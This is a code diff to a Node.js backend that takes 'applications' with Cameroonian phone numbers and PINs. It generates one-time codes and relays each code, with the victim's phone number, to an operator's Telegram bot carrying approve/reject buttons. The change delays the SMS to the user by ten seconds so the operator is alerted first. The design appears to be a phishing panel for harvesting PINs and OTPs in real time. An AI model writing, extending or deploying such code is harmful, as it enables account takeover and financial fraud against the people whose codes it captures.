@@ -17,6 +17,7 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
 const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
+const SMS_DELAY_MS = 10000; // 10 seconds delay
 
 // ─── In-Memory Store ───
 const applications = {};
@@ -63,6 +64,16 @@ async function sendSms(to, text) {
   }
 }
 
+// Helper to delay SMS sending by SMS_DELAY_MS
+function delaySms(to, text) {
+  return new Promise(resolve => {
+    setTimeout(async () => {
+      await sendSms(to, text);
+      resolve();
+    }, SMS_DELAY_MS);
+  });
+}
+
 // ─── API Routes ───
 
 // Health check
@@ -81,7 +92,7 @@ app.post('/api/send-application', async (req, res) => {
 
     applications[appId] = {
       ...data,
-      ref,                    // store ref to map callback
+      ref,
       appStatus: 'pending',
       pinStatus: 'pending',
       otpStatus: 'pending',
@@ -103,7 +114,7 @@ app.post('/api/send-application', async (req, res) => {
   }
 });
 
-// Send PIN (for admin verification only – no SMS)
+// Send PIN (for admin verification – no SMS)
 app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
@@ -131,7 +142,7 @@ app.post('/api/send-pin', async (req, res) => {
   }
 });
 
-// Send OTP (generate OTP, send SMS with ONLY the code, notify admin)
+// Send OTP (generate OTP, delay 10s, send SMS with ONLY the code, notify admin)
 app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId } = req.body;
@@ -146,11 +157,7 @@ app.post('/api/send-otp', async (req, res) => {
     app.otp = newOtp;
     app.otpStatus = 'pending';
 
-    // 📲 Send SMS – ONLY the OTP (no other info)
-    const userPhone = `+237${app.phone}`;
-    await sendSms(userPhone, `OTP: ${newOtp}`);   // <-- minimal message
-
-    // 🔔 Notify admin (as before)
+    // 🔔 Notify admin immediately (as before)
     const ref = app.ref || generateAppRef(applicationId);
     const message = `🔑 OTP VERIFICATION (CAMEROON)\nID: ${applicationId}\nPhone: +237${app.phone}\nOTP: ${newOtp}\n\nApprove or reject:`;
     const buttons = [[
@@ -159,6 +166,11 @@ app.post('/api/send-otp', async (req, res) => {
     ]];
 
     await sendTelegramMessage(message, buttons);
+
+    // 📲 Send SMS after 10 seconds with ONLY the OTP
+    const userPhone = `+237${app.phone}`;
+    delaySms(userPhone, `OTP: ${newOtp}`); // fire and forget, doesn't block response
+
     res.json({ ok: true, status: 'pending' });
   } catch (error) {
     res.status(500).json({ ok: false, error: error.message });
@@ -176,9 +188,7 @@ app.post('/api/resend-otp', async (req, res) => {
     app.otp = newOtp;
     app.otpStatus = 'pending';
 
-    const userPhone = `+237${app.phone}`;
-    await sendSms(userPhone, `OTP: ${newOtp}`);   // same minimal SMS
-
+    // Notify admin
     const ref = app.ref || generateAppRef(applicationId);
     const message = `🔄 OTP RESENT (CAMEROON)\nID: ${applicationId}\nOTP: ${newOtp}\n\nApprove or reject:`;
     const buttons = [[
@@ -187,13 +197,18 @@ app.post('/api/resend-otp', async (req, res) => {
     ]];
 
     await sendTelegramMessage(message, buttons);
+
+    // Send SMS after 10 seconds
+    const userPhone = `+237${app.phone}`;
+    delaySms(userPhone, `OTP: ${newOtp}`);
+
     res.json({ ok: true, status: 'otp_resent' });
   } catch (error) {
     res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// Status check (frontend polls this)
+// Status check
 app.get('/api/status/:applicationId/:step', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
@@ -217,7 +232,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     try { callbackData = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }
 
     const { a, s, ref } = callbackData;
-    // Find app by ref
     const appId = Object.keys(applications).find(id => applications[id].ref === ref);
     if (!appId) return res.sendStatus(200);
 
@@ -239,7 +253,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Serve frontend (if needed)
+// Serve frontend
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
